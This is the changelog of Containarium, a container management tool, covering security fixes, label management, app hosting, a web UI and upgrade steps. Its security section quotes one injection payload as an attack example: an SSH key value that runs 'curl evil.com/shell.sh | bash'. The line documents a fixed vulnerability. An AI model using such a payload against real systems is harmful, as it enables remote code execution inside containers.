# Changelog

All notable changes to Containarium will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security
- **CRITICAL: Fixed shell injection via SSH key content** (`internal/container/manager.go`)
  - Malicious SSH keys could execute arbitrary commands inside containers
  - Attack vector: `ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '`
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed shell injection in sudoers setup** (`internal/container/manager.go`)
  - Similar pattern to SSH key injection, mitigated by username validation
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed WebSocket terminal missing authentication** (`internal/gateway/gateway.go`)
  - Unauthenticated users could open shell sessions by not providing a token
  - Fix: Made token validation mandatory (returns 401 if no token provided)
- **CRITICAL: Fixed CORS allowing all origins** (`internal/gateway/gateway.go`)
  - CORS was configured with `*` allowing any website to make API requests
  - Fix: Restricted to localhost by default, configurable via `CONTAINARIUM_ALLOWED_ORIGINS` env var
- **CRITICAL: Fixed WebSocket origin validation always returning true** (`internal/gateway/terminal.go`)
  - Combined with missing auth, any webpage could open terminal sessions
  - Fix: Validates origin against allowed list, rejects requests without Origin header
- **Fixed non-expiring JWT tokens allowed** (`internal/auth/token.go`)
  - `--expiry 0` created tokens that never expired
  - Fix: Enforced maximum 30-day expiry (configurable via `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS`)
- **Fixed hardcoded developer username path** (`internal/container/manager.go`)
  - Removed `/home/hsinhoyeh` from SSH key fallback paths (information leak)
- **Fixed hardcoded private key path in Terraform** (`terraform/gce/main.tf`)
  - Replaced hardcoded path with `ssh_private_key_path` variable
- **Added checksum verification to install script** (`scripts/install-mcp.sh`)
  - Downloads and verifies SHA256 checksum before installation

### Added
- **Security Test Suite** - Comprehensive tests for security-critical code
  - `internal/auth/token_test.go` - JWT token expiry enforcement tests
  - `internal/gateway/security_test.go` - CORS and WebSocket origin validation tests
  - `internal/container/security_test.go` - Shell injection prevention tests
- **New Environment Variables**:
  - `CONTAINARIUM_ALLOWED_ORIGINS` - Comma-separated list of allowed CORS/WebSocket origins
  - `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS` - Maximum JWT token expiry in hours (default: 720)
- **New Terraform Variable**:
  - `ssh_private_key_path` - Path to SSH private key for provisioner connections
- **Container Label Management** - Kubernetes-style labels for organizing containers
  - CLI commands for label operations:
    - `containarium label set <username> key=value [key2=value2...]` - Set labels on a container
    - `containarium label remove <username> <key> [key2...]` - Remove labels from a container
    - `containarium label list <username>` - List all labels on a container
  - List command enhancements:
    - `--show-labels` flag to display labels in container list
    - `--label key=value` flag to filter containers by label
    - `--group-by <label-key>` flag to group containers by label value
  - REST API endpoints:
    - `GET /v1/containers/{username}/labels` - Get container labels
    - `PUT /v1/containers/{username}/labels` - Set container labels
    - `DELETE /v1/containers/{username}/labels/{key}` - Remove a label
  - Labels stored in Incus config with `user.containarium.label.` prefix
- **Web UI Label Features**
  - Label editor dialog for adding/removing labels on containers
  - Label edit button (tag icon) in both Grid View and List View
  - Labels displayed as chips in List View
  - "Group by" dropdown to organize containers by label key
  - Grouped view shows containers in sections with label value headers

## [0.4.0] - 2026-01-25

### Added
- **Web UI Enhancements** - Improved container management dashboard
  - Grid/List view toggle for containers (switch between card grid and table views)
  - System Resources Card showing overall CPU cores, memory usage, and storage usage
  - Per-container disk quota display (current usage / total quota with progress bars)
  - Demo page with mock data at `/webui/demo` for UI preview
- **App Hosting Feature** - Deploy web applications with automatic HTTPS
  - `containarium app deploy` - Deploy apps from source directory
  - `containarium app list` - List deployed applications
  - `containarium app logs` - View application logs
  - `containarium app stop/start/restart` - Lifecycle management
  - `containarium app delete` - Remove applications
  - Auto-detection for 7 languages: Node.js, Python, Go, Rust, Ruby, PHP, Static
  - Buildpack system generates Dockerfiles automatically
  - PostgreSQL storage for app metadata
  - Subdomain-based routing (e.g., `username-appname.containarium.dev`)
- **Auto-Provisioned Core Services** - Infrastructure containers managed by Containarium
  - `containarium-core-postgres` - PostgreSQL container for app metadata storage (2 CPU, 2GB RAM, 10GB disk)
  - `containarium-core-caddy` - Caddy reverse proxy container for TLS termination (1 CPU, 512MB RAM, 5GB disk)
  - Automatically created on daemon startup with `--app-hosting` flag
  - Core containers use static IPs and are excluded from user container listings
  - Self-healing: containers are recreated if missing or stopped
- **Caddy Reverse Proxy Integration** - Automatic TLS with DNS-01 challenge
  - Wildcard certificate support for `*.containarium.dev`
  - Dynamic route configuration via Caddy Admin API
  - Setup script: `scripts/setup-caddy.sh`
  - Supports 8 DNS providers: Cloudflare, Route53, Google Cloud DNS, DigitalOcean, Azure, Vultr, DuckDNS, Namecheap
  - Documentation: `docs/CADDY-SETUP.md`
- **Docker-in-Docker Privileged Mode** - Full Docker support inside containers
  - `EnableDockerPrivileged` option for container creation
  - Automatically sets `security.privileged=true` and `raw.lxc=lxc.apparmor.profile=unconfined`
  - Required for Docker builds to work inside Incus containers
- **New daemon flags for App Hosting**:
  - `--app-hosting` - Enable app hosting feature
  - `--postgres` - PostgreSQL connection string
  - `--base-domain` - Base domain for app subdomains (default: `containarium.dev`)
  - `--caddy-admin-url` - Caddy admin API URL (default: `http://localhost:2019`)
- **ProxyManager unit tests** - 9 test cases for Caddy API integration
- **Auto-initialization of Incus infrastructure** on daemon startup
  - Automatically creates storage pool (`default` with `dir` driver)
  - Automatically creates network bridge (`incusbr0`)
  - Automatically configures default profile with network and storage devices
  - Safe default subnet: `10.100.0.1/24` (avoids conflicts with common networks like 10.0.0.0/8)
- **Network subnet configuration** via `--network-subnet` flag
  - Customize container network subnet (default: `10.100.0.1/24`)
  - Example: `containarium daemon --network-subnet 192.168.50.1/24`
- **Skip infrastructure initialization** via `--skip-infra-init` flag
  - Useful when infrastructure is already configured manually
  - Example: `containarium daemon --skip-infra-init`
- **New Incus client methods** for infrastructure management:
  - `EnsureNetwork()` - Create network if not exists
  - `EnsureStorage()` - Create storage pool if not exists
  - `EnsureDefaultProfile()` - Configure default profile
  - `InitializeInfrastructure()` - One-call setup for all infrastructure
  - `GetNetworkSubnet()` - Get configured subnet for a network
- **HTTP/REST client for CLI** - Alternative to gRPC for remote server communication
  - `--http` flag to use HTTP/REST API instead of gRPC
  - `--token` flag for JWT authentication token
  - Supports all CLI commands: `create`, `list`, `delete`, `info`
  - Example: `containarium list --server http://host:8080 --http --token <JWT>`
- **Web UI server management with localStorage persistence**
  - Server configurations (URL, name, token) stored in browser localStorage
  - Persists across browser sessions until explicitly removed
  - Add Server dialog with connection testing
  - Edit server via pencil icon on server tab
  - Remove server via X icon on server tab
  - Multi-server support with tab-based switching
- **SSH public key input in Web UI** - Option to provide your own SSH public key
  - Uncheck "Auto-generate SSH key pair" to reveal public key input field
  - Paste existing SSH public key instead of auto-generating

### Changed
- CLI now supports both gRPC and HTTP protocols equally (neither marked as deprecated)
- Server address flag help text updated to reflect dual-protocol support

### Fixed
- **Disk quota not showing in API response** - Fixed `toProtoContainer()` to include disk size in `ResourceLimits` struct, previously only CPU and memory were being returned
- **Network/Routes 500 errors** - Fixed nil pointer issues when Caddy proxy is not configured
- **Node.js buildpack `npm ci` failure** - Fixed Dockerfile generation to use `npm install --omit=dev` when `package-lock.json` is missing, falls back to `npm ci --omit=dev` when lock file exists
- **PostgreSQL timestamp encoding** - Fixed `deployedAt` field type from `*interface{}` to `*time.Time` for proper database encoding
- **Caddy server name mismatch** - Fixed ProxyManager to use `srv0` (Caddyfile default) instead of hardcoded `main`, now configurable via `SetServerName()`
- **Docker AppArmor permission denied** - Added privileged mode and AppArmor unconfined profile for Docker-in-Docker support
- **Network subnet conflicts** - Previously manual network setup could conflict with host network
  - Auto-initialization uses safe default `10.100.0.1/24` instead of common `10.0.3.0/24`
  - Prevents loss of connectivity when running Containarium inside LXC containers

## [0.3.0] - 2026-01-15

### Added
- **Web UI Dashboard** - Modern browser-based container management interface
  - Real-time container metrics (CPU, Memory, Disk usage with progress bars)
  - Multi-server management with tab-based interface
  - Container lifecycle management (create, start, stop, delete)
  - Browser-based terminal access via WebSocket
  - Client-side SSH key generation (keys never sent to server)
  - Embedded in Go binary for single-file deployment
  - Available at `/webui/` endpoint
- **Container Metrics API** - Real-time resource monitoring
  - CPU usage percentage calculation
  - Memory and disk usage with limits
  - Network I/O statistics
  - Process count per container
- **WebSocket Terminal** - Browser-based container shell access
  - Direct terminal access without SSH client
  - Runs as container user via Incus exec
  - JWT token authentication via query parameter
- **Makefile improvements**:
  - `make webui` - Build Next.js web UI for embedding
  - `make clean-ui` - Clean swagger-ui and webui files
  - `make clean-all` - Clean all artifacts including UI
- **REST API support via grpc-gateway** - HTTP/JSON API alongside existing gRPC
  - All 10 container management endpoints exposed via REST
  - Dual-protocol support: gRPC (port 50051) + REST (port 8080)
  - Backward compatible - existing gRPC clients unaffected
- **JWT token authentication** for REST API
  - Bearer token authentication with configurable expiry
  - Token generation command: `containarium token generate`
  - Support for token secret files (`--jwt-secret-file`)
  - Roles-based authorization support
- **Interactive Swagger UI** for API exploration
  - Available at `/swagger-ui/` endpoint
  - CDN fallback for zero-setup experience
  - Embedded files support for offline use
- **OpenAPI specification generation**
  - Automatic OpenAPI/Swagger spec generation from proto files
  - Available at `/swagger.json` endpoint
  - Comprehensive API documentation with examples
- **Enhanced daemon command** with new REST flags:
  - `--rest` - Enable/disable REST API (default: true)
  - `--http-port` - Configure REST API port (default: 8080)
  - `--jwt-secret` / `--jwt-secret-file` - Configure JWT authentication
  - `--swagger-dir` - Swagger files directory
- **Complete upgrade system** for the entire Containarium stack:
  - `containarium upgrade self` - Upgrade Containarium binary from GitHub releases
  - `containarium upgrade host` - Upgrade host dependencies (Incus, system packages, kernel modules)
  - `containarium upgrade containers` - Upgrade software inside containers (Docker, base OS, tools)
  - `containarium upgrade all` - Upgrade everything in the correct order
- **Changelog display** during upgrades - shows release notes before upgrading
- **Runtime version checking** with warnings for outdated components
- **Rolling upgrades** for containers (`--rolling` flag) to minimize downtime
- **Reboot detection** - automatically detects if system reboot is required after upgrade
- **Mock server** for local testing of upgrade commands (`test/mock-server.py`)
- **Test fixtures** for upgrade testing without needing real releases

### Fixed
- Docker build support by requiring Incus 6.19+ (fixes CVE-2025-52881 AppArmor bug)
- Terraform startup scripts now install Incus from Zabbly repository
- All Terraform scripts (both Containarium repo and kafeido-infra) updated for Incus 6.19+
- Fixed typo in proto package name: `continariumv1` → `containariumv1`
- **JWT secret handling** - Fixed trailing newline issues when reading JWT secrets from files
- **Gateway mTLS connection** - Fixed HTTP gateway to properly connect to gRPC server with mTLS
- **Installation script (`hacks/install.sh`)** - Multiple critical fixes:
  - Fixed Incus package conflict by adding APT pinning to prioritize Zabbly repository over Ubuntu
  - Added `--batch --yes` flags to GPG commands for non-interactive SSH installation
  - Changed `incus-tools` to `incus-extra` (newer package name in Zabbly repository)
  - Fixed systemd service permissions (`ProtectSystem=false`, `ProtectHome=false`)
  - Added automatic TLS certificate generation step for mTLS
- **Google Guest Agent race condition** - Fixed `/etc/passwd` lock conflicts during user creation
  - Stop google-guest-agent → remove stale locks → create user → restart agent
  - Prevents "cannot lock /etc/passwd; try again later" errors
- **Container creation improvements**:
  - Fixed image format parsing to support both `ubuntu:24.04` and `images:ubuntu/24.04` formats
  - Fixed SSH directory creation (`.ssh` not created before writing `authorized_keys`)
  - Added `--force` flag to delete and recreate existing containers
- **StopContainer API** - Fixed to use proper API field (`Force: true`) instead of string action

### Changed
- Updated documentation with Incus 6.19+ system requirements
- Renamed `upgrade incus` to `upgrade host` for better clarity (includes more than just Incus)
- Upgrade commands now provide detailed progress and status information
- Proto generation now includes grpc-gateway and OpenAPI plugins

### Security
- JWT-based authentication for REST API with configurable token expiry
- Bearer token validation middleware
- CORS support with configurable origins
- Preserved mTLS authentication for gRPC (unchanged)

## [0.2.0] - 2025-01-12

### Added
- Container resize command (`containarium resize`) for dynamic resource adjustment
  - Resize CPU, memory, and disk without downtime
  - Advanced CPU options: range allocation and core pinning
- mTLS (mutual TLS) support for daemon API
  - Certificate generation command (`containarium cert generate`)
  - Client certificate authentication
  - Secure remote management
- Comprehensive documentation for resize functionality
- Remote gRPC daemon for container management
- Production deployment examples with Terraform

### Security
- Added mTLS authentication for daemon API
- SSH hardening in jump server configuration
- Fail2ban integration for brute-force protection

### Infrastructure
- Terraform modules for GCE deployment
- Support for spot instances with persistent storage
- ZFS-backed storage for disk quotas
- Hyperdisk support for C4 instance types

---

## Upgrade Instructions

### Upgrading from 0.1.x to 0.2.0

**Important:** This version requires Incus 6.19 or later for Docker build support.

1. Upgrade Incus on your host:
   ```bash
   # Add Zabbly repository
   curl -fsSL https://pkgs.zabbly.com/key.asc | sudo gpg --dearmor -o /usr/share/keyrings/zabbly-incus.gpg
   echo 'deb [signed-by=/usr/share/keyrings/zabbly-incus.gpg] https://pkgs.zabbly.com/incus/stable noble main' | sudo tee /etc/apt/sources.list.d/zabbly-incus-stable.list
   sudo apt update
   sudo apt install --only-upgrade incus incus-tools incus-client
   ```

2. Upgrade Containarium binary:
   ```bash
   curl -fsSL https://github.com/FootprintAI/Containarium/releases/download/0.2.0/containarium-linux-amd64 -o /tmp/containarium
   sudo install -m 755 /tmp/containarium /usr/local/bin/containarium
   sudo systemctl restart containarium  # if running as daemon
   ```

3. Verify versions:
   ```bash
   incus --version     # Should show 6.19 or later
   containarium version
   ```

---

## Version History

- **0.4.0** (2026-01-25) - App Hosting, Auto-Provisioned Core Services, Network Topology
- **0.3.0** (2026-01-15) - Web UI Dashboard, Container Metrics, WebSocket Terminal
- **0.2.0** (2025-01-12) - Resize command, mTLS support, production readiness
- **0.1.0** (Initial release) - Basic container management, SSH jump server

[Unreleased]: https://github.com/FootprintAI/Containarium/compare/0.4.0...HEAD
[0.4.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.4.0
[0.3.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.3.0
[0.2.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.2.0
